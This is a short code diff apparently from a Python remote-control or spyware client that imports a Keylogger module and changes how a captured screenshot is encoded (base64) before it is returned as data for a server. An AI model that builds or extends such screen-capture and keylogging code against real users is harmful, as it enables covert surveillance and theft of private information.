@@ -1,6 +1,7 @@
 import Keylogger
 import ProcessRunning
 
+import base64
 import io
 import pyautogui
 import wmi
@@ -13,7 +14,7 @@ def action_screenshot(option, data):
     img = pyautogui.screenshot()
     b = io.BytesIO()
     img.save(b, format='PNG')
-    server_data = str(b.getvalue())
+    server_data = base64.b64encode(b.getvalue()).decode('utf-8')
 
     return (error_code, server_data)
 
